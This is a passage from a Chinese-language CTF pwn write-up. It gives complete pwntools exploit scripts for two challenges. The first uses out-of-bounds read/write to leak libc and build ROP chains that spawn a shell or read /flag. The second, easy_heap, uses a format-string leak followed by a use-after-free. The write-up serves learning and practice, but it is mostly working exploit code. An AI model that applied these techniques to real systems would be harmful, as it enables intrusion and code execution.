io.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">2</span>))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Idx:&quot;</span>,<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Num:&quot;</span>,<span class=\"built_in\">str</span>(low_num))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">2</span>))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Idx:&quot;</span>,<span class=\"built_in\">str</span>(index+<span class=\"number\">1</span>))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Num:&quot;</span>,<span class=\"built_in\">str</span>(high_num))</span><br><span class=\"line\"></span><br><span class=\"line\">libcbase = read1(<span class=\"number\">262</span>) - <span class=\"number\">0x240b3</span></span><br><span class=\"line\"><span class=\"comment\">#print(hex(libcbase3))</span></span><br><span class=\"line\"></span><br><span class=\"line\">pop_rdi = libcbase +<span class=\"number\">0x000000023b72</span></span><br><span class=\"line\">system = libcbase + mylibc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">binsh = libcbase +<span class=\"number\">0x00000000001b45bd</span></span><br><span class=\"line\"></span><br><span class=\"line\">write1(<span class=\"number\">262</span>,pop_rdi)</span><br><span class=\"line\">write1(<span class=\"number\">264</span>,binsh)</span><br><span class=\"line\">write1(<span class=\"number\">266</span>,system)</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">0</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p><font color=\"red\">这里有个大坑…栈对其? 栈平衡?  是的,需要加一个ret,不过为什么呢??</font></p>\n<p>看了一下出题人用的libc版本:GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.9)</p>\n<p>前面onegadget瞎猫碰死耗子..</p>\n<p>会什么会加载四个呢??,比如libc, 减哪个的值呢? 减最开头的</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-27-5%E6%9C%88%E4%B9%99%E9%98%9F%E6%9C%88%E8%B5%9B%E4%B8%89%E9%A2%98/image-20230522165144751.png\" alt=\"image-20230522165144751\"></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-27-5%E6%9C%88%E4%B9%99%E9%98%9F%E6%9C%88%E8%B5%9B%E4%B8%89%E9%A2%98/image-20230522170302148.png\" alt=\"image-20230522170302148\"></p>\n<h2 id=\"orw解法\"><a href=\"#orw解法\" class=\"headerlink\" title=\"orw解法\"></a>orw解法</h2><p>​\t\t记录一下……其实没必要..</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(arch=<span class=\"string\">&#x27;i386&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">mylibc = ELF(<span class=\"string\">&#x27;/root/pwn/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/libc.so.6&#x27;</span>)</span><br><span class=\"line\">io = process(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">readone</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Idx:&quot;</span>,<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">writeone</span>(<span class=\"params\">index,content</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">2</span>))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Idx:&quot;</span>,<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Num:&quot;</span>,<span class=\"built_in\">str</span>(content))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">writeone(<span class=\"number\">0</span>,<span class=\"number\">1852400175</span>)</span><br><span class=\"line\">writeone(<span class=\"number\">1</span>,<span class=\"number\">6845231</span>)</span><br><span class=\"line\">readone(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">readone(<span class=\"number\">262</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;The num: &quot;</span>)</span><br><span class=\"line\">addr1 = io.recv(<span class=\"number\">10</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">readone(<span class=\"number\">263</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;The num: &quot;</span>)</span><br><span class=\"line\">addr2 = io.recv(<span class=\"number\">5</span>)</span><br><span class=\"line\"><span class=\"comment\">#print(hex(int(addr1)))</span></span><br><span class=\"line\"><span class=\"comment\">#print(hex(int(addr2)))</span></span><br><span class=\"line\"></span><br><span class=\"line\">system = <span class=\"built_in\">int</span>(addr1) - <span class=\"number\">231</span> + <span class=\"number\">0x2d799</span></span><br><span class=\"line\">libcbase = <span class=\"built_in\">int</span>(addr1) - <span class=\"number\">0x21c87</span></span><br><span class=\"line\"><span class=\"comment\">#print(hex(system))</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">readone(<span class=\"number\">270</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;The num: &quot;</span>)</span><br><span class=\"line\">mainlow = io.recv(<span class=\"number\">10</span>)</span><br><span class=\"line\">readone(<span class=\"number\">271</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;The num: &quot;</span>)</span><br><span class=\"line\">mainhigh = io.recv(<span class=\"number\">5</span>)</span><br><span class=\"line\"><span class=\"comment\">#print(mainhigh)</span></span><br><span class=\"line\"></span><br><span class=\"line\">pop_rdi = libcbase + <span class=\"number\">0x002164f</span></span><br><span class=\"line\">pop2 = libcbase+<span class=\"number\">0x022394</span></span><br><span class=\"line\">pop_rsi = libcbase +<span class=\"number\">0x0000023a6a</span></span><br><span class=\"line\">pop_rdx = libcbase + <span class=\"number\">0x001b96</span></span><br><span class=\"line\">writeone(<span class=\"number\">262</span>,pop_rdi)</span><br><span class=\"line\"><span class=\"comment\">#writeone(263,mainhigh)</span></span><br><span class=\"line\"></span><br><span class=\"line\">binsh = libcbase +<span class=\"number\">0x001b3d88</span></span><br><span class=\"line\"><span class=\"comment\">#binsh  = libcbase + mylibc.search(b&quot;/bin/sh&quot;)</span></span><br><span class=\"line\">writeone(<span class=\"number\">264</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">writeone(<span class=\"number\">265</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">writeone(<span class=\"number\">266</span>,pop_rsi)</span><br><span class=\"line\">writeone(<span class=\"number\">267</span>,<span class=\"built_in\">int</span>(addr2))</span><br><span class=\"line\"></span><br><span class=\"line\">writeone(<span class=\"number\">268</span>,<span class=\"built_in\">int</span>(mainlow)+<span class=\"number\">0x202100</span>)</span><br><span class=\"line\">writeone(<span class=\"number\">269</span>,<span class=\"built_in\">int</span>(mainhigh))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">writeone(<span class=\"number\">270</span>,pop_rdx)</span><br><span class=\"line\">writeone(<span class=\"number\">271</span>,<span class=\"built_in\">int</span>(addr2))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">writeone(<span class=\"number\">272</span>,<span class=\"number\">32</span>)</span><br><span class=\"line\">writeone(<span class=\"number\">273</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">read = libcbase + mylibc.symbols[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\">writeone(<span class=\"number\">274</span>,read)</span><br><span class=\"line\">writeone(<span class=\"number\">275</span>,<span class=\"built_in\">int</span>(addr2))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># open</span></span><br><span class=\"line\">writeone(<span class=\"number\">276</span>,pop_rdi)</span><br><span class=\"line\">writeone(<span class=\"number\">277</span>,<span class=\"built_in\">int</span>(addr2))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">writeone(<span class=\"number\">278</span>,<span class=\"built_in\">int</span>(mainlow)+<span class=\"number\">0x202100</span>)</span><br><span class=\"line\">writeone(<span class=\"number\">279</span>,<span class=\"built_in\">int</span>(mainhigh))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">writeone(<span class=\"number\">289</span>,<span class=\"built_in\">int</span>(addr2))</span><br><span class=\"line\"><span class=\"comment\"># read</span></span><br><span class=\"line\"></span><br><span class=\"line\">writeone(<span class=\"number\">290</span>,pop_rdi)</span><br><span class=\"line\">writeone(<span class=\"number\">291</span>,<span class=\"built_in\">int</span>(addr2))</span><br><span class=\"line\"></span><br><span class=\"line\">writeone(<span class=\"number\">292</span>,<span class=\"number\">3</span>)</span><br><span class=\"line\">writeone(<span class=\"number\">293</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">writeone(<span class=\"number\">294</span>,pop_rsi)</span><br><span class=\"line\">writeone(<span class=\"number\">295</span>,<span class=\"built_in\">int</span>(addr2))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">writeone(<span class=\"number\">296</span>,<span class=\"built_in\">int</span>(mainlow)+<span class=\"number\">0x202100</span>)</span><br><span class=\"line\">writeone(<span class=\"number\">297</span>,<span class=\"built_in\">int</span>(mainhigh))</span><br><span class=\"line\"></span><br><span class=\"line\">writeone(<span class=\"number\">298</span>,pop_rdx)</span><br><span class=\"line\">writeone(<span class=\"number\">299</span>,<span class=\"built_in\">int</span>(addr2))</span><br><span class=\"line\"></span><br><span class=\"line\">writeone(<span class=\"number\">300</span>,<span class=\"number\">32</span>)</span><br><span class=\"line\">writeone(<span class=\"number\">301</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">writeone(<span class=\"number\">302</span>,read)</span><br><span class=\"line\">writeone(<span class=\"number\">303</span>,<span class=\"built_in\">int</span>(addr2))</span><br><span class=\"line\"><span class=\"comment\">#system = libcbase + 0x14b88</span></span><br><span class=\"line\"><span class=\"comment\"># write</span></span><br><span class=\"line\"></span><br><span class=\"line\">writeone(<span class=\"number\">304</span>,pop_rdi)</span><br><span class=\"line\">writeone(<span class=\"number\">305</span>,<span class=\"built_in\">int</span>(addr2))</span><br><span class=\"line\"></span><br><span class=\"line\">writeone(<span class=\"number\">306</span>,<span class=\"number\">1</span>)</span><br><span class=\"line\">writeone(<span class=\"number\">307</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">writeone(<span class=\"number\">308</span>,pop_rsi)</span><br><span class=\"line\">writeone(<span class=\"number\">309</span>,<span class=\"built_in\">int</span>(addr2))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">writeone(<span class=\"number\">310</span>,<span class=\"built_in\">int</span>(mainlow)+<span class=\"number\">0x202100</span>)</span><br><span class=\"line\">writeone(<span class=\"number\">311</span>,<span class=\"built_in\">int</span>(mainhigh))</span><br><span class=\"line\"></span><br><span class=\"line\">writeone(<span class=\"number\">312</span>,pop_rdx)</span><br><span class=\"line\">writeone(<span class=\"number\">313</span>,<span class=\"built_in\">int</span>(addr2))</span><br><span class=\"line\"></span><br><span class=\"line\">writeone(<span class=\"number\">314</span>,<span class=\"number\">32</span>)</span><br><span class=\"line\">writeone(<span class=\"number\">315</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">write1 = libcbase + mylibc.symbols[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">writeone(<span class=\"number\">316</span>,write1)</span><br><span class=\"line\">writeone(<span class=\"number\">317</span>,<span class=\"built_in\">int</span>(addr2))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">0</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendline(<span class=\"string\">&quot;/flag\\x00&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(io.recv(<span class=\"number\">100</span>))</span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"2-easy-heap\"><a href=\"#2-easy-heap\" class=\"headerlink\" title=\"2. easy_heap\"></a>2. easy_heap</h1><p><a href=\"https://blingblingxuanxuan.github.io/2020/03/01/hacknote/\">https://blingblingxuanxuan.github.io/2020/03/01/hacknote/</a></p>\n<p>​\t\t刚拿到这道题的时候就发现特别熟悉…想了下是道原题(hacknote),不过进行了点小的修改.</p>\n<p>​\t\t给自己的提醒是做题或者以后的实战中,要有一个清晰的思路,不是想到什么干什么,而是先从最简单的最好用的开始,比如这道题,其实有后门函数可以直接利用,但自己一开始想到的就是构造rop链(不过为什么没成功呢???后面分析)</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-27-5%E6%9C%88%E4%B9%99%E9%98%9F%E6%9C%88%E8%B5%9B%E4%B8%89%E9%A2%98/image-20230523154826731.png\" alt=\"image-20230523154826731\">get_library_name 中有格式化字符串</p>\n<h2 id=\"泄露程序加载地址\"><a href=\"#泄露程序加载地址\" class=\"headerlink\" title=\"泄露程序加载地址\"></a>泄露程序加载地址</h2><p>​\t\t前面多加了这个函数,有格式化字符串漏洞,可以利用这个泄露栈上的地址</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">int</span> <span class=\"title function_\">get_library_name</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> format; <span class=\"comment\">// [esp+Ch] [ebp-2Ch]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v2; <span class=\"comment\">// [esp+2Ch] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v2 = __readgsdword(<span class=\"number\">0x14</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;please input the library name:&quot;</span>);</span><br><span class=\"line\">  _isoc99_scanf(<span class=\"string\">&quot;%32s&quot;</span>, &amp;format);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(&amp;format);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(&amp;byte_1198);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readgsdword(<span class=\"number\">0x14</span>u) ^ v2;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t第19个位置是main+89</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-27-5%E6%9C%88%E4%B9%99%E9%98%9F%E6%9C%88%E8%B5%9B%E4%B8%89%E9%A2%98/image-20230523155647057.png\" alt=\"image-20230523155647057\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">io.sendline(<span class=\"string\">&quot;%x.%x.aaa%19$d.%x.%x.%x&quot;</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;aaa&quot;</span>)</span><br><span class=\"line\">flag = <span class=\"built_in\">int</span>(io.recv(<span class=\"number\">10</span>)) - <span class=\"number\">0x208</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t-0x208 &#x3D;  - 0x100e + 0xe06 </p>\n<p>​\t\t-0x100e是main+89距离文件起始处的位置, 0xe06是magic后门函数的偏移</p>\n<h2 id=\"exp-1\"><a href=\"#exp-1\" class=\"headerlink\" title=\"exp\"></a>exp</h2><p>​\t\t同样还是hacknote的堆处理方法,把函数地址替换成magic就可以了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(arch=<span class=\"string\">&#x27;i386&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">mylibc = ELF(<span class=\"string\">&#x27;/root/pwn/glibc-all-in-one/libs/2.23-0ubuntu3_i386/libc.so.6&#x27;</span>)</span><br><span class=\"line\">io = process(<span class=\"string\">&quot;./easy_heap&quot;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add_note</span>(<span class=\"params\">size,content</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;choice :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;size :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Content :&quot;</span>)</span><br><span class=\"line\">    io.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">del_note</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;choice :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Index :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">print_note</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;choice :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Index :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;please input the library name:&quot;</span>)</span><br><span class=\"line\">io.sendline(<span class=\"string\">&quot;%x.%x.aaa%19$d.%x.%x.%x&quot;</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;aaa&quot;</span>)</span><br><span class=\"line\">flag = <span class=\"built_in\">int</span>(io.recv(<span class=\"number\">10</span>)) -<span class=\"number\">0x208</span></span><br><span class=\"line\"><span class=\"comment\">#flag = u32(io.recv(5)[1:])</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#flag = int(io.recv(10)) -0x5188+0xe06</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#flag = u32(io.recv(4))</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(flag))</span><br><span class=\"line\">add_note(<span class=\"number\">64</span>,<span class=\"string\">&quot;12&quot;</span>)</span><br><span class=\"line\">add_note(<span class=\"number\">32</span>,<span class=\"string\">&quot;12&quot;</span>)</span><br><span class=\"line\">del_note(<span class=\"number\">0</span>)</span><br><span class=\"line\">add_note(<span class=\"number\">64</span>,<span class=\"string\">&quot;45&quot;</span>)</span><br><span class=\"line\">print_note(<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"comment\"># del_note(4)</span></span><br><span class=\"line\">del_note(<span class=\"number\">0</span>)</span><br><span class=\"line\">del_note(<span class=\"number\">1</span>)</span><br><span class=\"line\">add_note(<span class=\"number\">8</span>,p32(flag))</span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br><span class=\"line\">print_note(<span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"comment\">#io.recv()</span></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"但是为什么我的system-“-x2F-bin-x2F-sh”-没成功呢\"><a href=\"#但是为什么我的system-“-x2F-bin-x2F-sh”-没成功呢\" class=\"headerlink\" title=\"但是为什么我的system(“&#x2F;bin&#x2F;sh”)没成功呢?\"></a>但是为什么我的system(“&#x2F;bin&#x2F;sh”)没成功呢?</h2><p>​\t\t先确认下libc版本吧… ubuntu16.04, 首先是libc版本问题,然后本地没成功的话,应该是因为栈平衡?</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(arch=<span class=\"string\">&#x27;i386&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">myelf = ELF(<span class=\"string\">&#x27;./easy_heap&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#mylibc = ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class=\"line\">mylibc = ELF(<span 